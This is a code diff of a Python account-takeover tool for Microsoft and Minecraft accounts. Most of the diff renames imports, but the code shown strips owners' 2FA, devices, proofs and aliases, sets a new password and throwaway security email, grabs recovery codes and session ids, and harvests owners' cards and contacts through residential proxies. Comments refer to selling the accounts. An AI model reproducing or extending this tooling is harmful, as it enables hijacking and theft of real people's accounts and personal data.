@@ -1,43 +1,43 @@
-from securing.utils.security.change_primary_alias import change_primary_alias
-from securing.utils.security.get_security_mail import get_security_email
-from securing.utils.security.add_authenticator import add_authenticator
-from securing.utils.security.get_recovery_code import get_recovery_code
-from securing.utils.security_information import security_information
-from securing.utils.security.remove_services import remove_services
-from securing.utils.security.remove_devices import remove_devices
-from securing.utils.security.delete_aliases import delete_aliases
-from securing.utils.security.remove_proof import remove_proof
-from securing.utils.security.remove_fed_cred import remove_fed_cred
-from securing.utils.security.leave_family import leave_family
-from securing.utils.security.remove_zyger import remove_zyger
-from securing.utils.security.remove_2fa import remove_2fa
-from securing.utils.security.recovery import recover
+from authsecuring.utils.security.change_primary_alias import change_primary_alias
+from authsecuring.utils.security.get_security_mail import get_security_email
+from authsecuring.utils.security.add_authenticator import add_authenticator
+from authsecuring.utils.security.get_recovery_code import get_recovery_code
+from authsecuring.utils.security_information import security_information
+from authsecuring.utils.security.remove_services import remove_services
+from authsecuring.utils.security.remove_devices import remove_devices
+from authsecuring.utils.security.delete_aliases import delete_aliases
+from authsecuring.utils.security.remove_proof import remove_proof
+from authsecuring.utils.security.remove_fed_cred import remove_fed_cred
+from authsecuring.utils.security.leave_family import leave_family
+from authsecuring.utils.security.remove_zyger import remove_zyger
+from authsecuring.utils.security.remove_2fa import remove_2fa
+from authsecuring.utils.security.recovery import recover
 
-from securing.utils.ogi.get_subscriptions import get_subscriptions
-from securing.utils.ogi.get_owner_info import get_owner_info
-from securing.utils.ogi.get_contacts import get_contacts
-from securing.utils.ogi.get_devices import get_devices
-from securing.utils.ogi.get_family import get_family
-from securing.utils.ogi.get_cards import get_cards
+from authsecuring.utils.ogi.get_subscriptions import get_subscriptions
+from authsecuring.utils.ogi.get_owner_info import get_owner_info
+from authsecuring.utils.ogi.get_contacts import get_contacts
+from authsecuring.utils.ogi.get_devices import get_devices
+from authsecuring.utils.ogi.get_family import get_family
+from authsecuring.utils.ogi.get_cards import get_cards
 
-from securing.utils.cookies.get_cookies import get_cookies
-from securing.utils.cookies.get_amrp import get_amrp
-from securing.utils.cookies.get_amc import get_amc
-from securing.utils.cookies.get_t import get_t
-from securing.utils.cookies.safe_cookies import iter_cookies
+from authsecuring.utils.cookies.get_cookies import get_cookies
+from authsecuring.utils.cookies.get_amrp import get_amrp
+from authsecuring.utils.cookies.get_amc import get_amc
+from authsecuring.utils.cookies.get_t import get_t
+from authsecuring.utils.cookies.safe_cookies import iter_cookies
 
-from securing.utils.security.logout_all import logout_all
+from authsecuring.utils.security.logout_all import logout_all
 
-from minecraft.get_profile import get_profile
-from minecraft.get_ssid import get_ssid
+from mc.get_profile import get_profile
+from mc.get_ssid import get_ssid
 
-from minecraft.get_namechange import get_username_info
-from minecraft.get_method import get_method_details
-from minecraft.get_capes import get_capes
-from minecraft.get_xbl import get_xbl
-from minecraft.retry import NoMinecraftEntitlement
+from mc.get_namechange import get_username_info
+from mc.get_method import get_method_details
+from mc.get_capes import get_capes
+from mc.get_xbl import get_xbl
+from mc.retry import NoMinecraftEntitlement
 
-from database.database import DBConnection
+from storage.romeo_db import RomeoDB as DBConnection
 import asyncio
 import httpx
 import uuid
@@ -112,7 +112,7 @@ async def _minecraft_sso_client(session: httpx.AsyncClient) -> httpx.AsyncClient
     sisu.xboxlive.com often dies through residential HTTP CONNECT, so Xbox
     hosts go direct.
     """
-    from securing.utils.proxy import LiveXboxSplitTransport, microsoft_proxy_url
+    from authsecuring.utils.proxy import LiveXboxSplitTransport, microsoft_proxy_url
 
     headers = {
         "User-Agent": session.headers.get(
@@ -283,7 +283,7 @@ async def secure(
     try:
         verification_tokens = await get_amc(session)
     except Exception as exc:
-        from securing.utils.proxy import format_exception_reason
+        from authsecuring.utils.proxy import format_exception_reason
 
         detail = format_exception_reason(exc)
         log.exception("get_amc failed: %s", detail)
@@ -338,7 +338,7 @@ async def secure(
             )
 
     if embed_verify:
-        from securing.account_filters import is_embed_verify_no_minecraft
+        from authsecuring.account_filters import is_embed_verify_no_minecraft
 
         if is_embed_verify_no_minecraft(account_info):
             print(
@@ -373,7 +373,7 @@ async def secure(
     # Profile API often 401s when MSAL silent bridge never finishes — JWT still
     # has given_name / family_name / birthdate / ctry (dona-era accounts too).
     if not owner_info.get("firstName") and not owner_info.get("signInEmail"):
-        from securing.utils.ogi.owner_from_jwt import owner_info_from_amc_jwt
+        from authsecuring.utils.ogi.owner_from_jwt import owner_info_from_amc_jwt
 
         jwt_info = owner_info_from_amc_jwt(session)
         if jwt_info:
@@ -668,7 +668,7 @@ async def secure(
                         break
                     # Detect sunny we already parked on the account
                     try:
-                        from securing.utils.security.change_primary_alias import (
+                        from authsecuring.utils.security.change_primary_alias import (
                             _get_manage,
                         )
 
@@ -698,7 +698,7 @@ async def secure(
                     # (old login still exists — live UI uses removeOldPrimary=false)
                     # or GCT if Microsoft dropped the previous Outlook login.
                     try:
-                        from securing.utils.security.change_primary_alias import (
+                        from authsecuring.utils.security.change_primary_alias import (
                             _confirm_primary_switched,
                         )
 
@@ -754,7 +754,7 @@ async def secure(
         if can_recover:
 
             security_email = uuid.uuid4().hex[:16]
-            from securing.utils.security.password_gen import generate_ms_password
+            from authsecuring.utils.security.password_gen import generate_ms_password
             password = generate_ms_password(14)
 
             security_email = f"{security_email}@{domain}"
@@ -823,7 +823,7 @@ async def secure(
         # a freshly added sunny* alias (previous bug).
         # Also runs after sunny-skip so old outlook/gmail aliases still get wiped.
         try:
-            from securing.utils.security.force_password import strip_unverified
+            from authsecuring.utils.security.force_password import strip_unverified
 
             ms_now = account_info.get("microsoft") or {}
             await delete_aliases(
@@ -841,7 +841,7 @@ async def secure(
         # recovery code while silently ignoring the new password. Previously we
         # only ran this when marked UNVERIFIED, so Sell (2FA) got a dead password.
         try:
-            from securing.utils.security.force_password import ensure_password_verified
+            from authsecuring.utils.security.force_password import ensure_password_verified
 
             ms_pwd = str((account_info.get("microsoft") or {}).get("password") or "")
             if ms_pwd and ms_pwd not in ("Unknown", "Couldn't Change!", "Failed"):
@@ -881,7 +881,7 @@ async def secure(
         # Phone pullback probe — HasPhone can stay 1 even when smsProofs is empty
         # on the manage page (ghost phone / legacy SMS recovery).
         try:
-            from securing.autobuy_hold_check import fetch_credential_type
+            from authsecuring.autobuy_hold_check import fetch_credential_type
 
             probe_email = (
                 (account_info.get("microsoft") or {}).get("email")
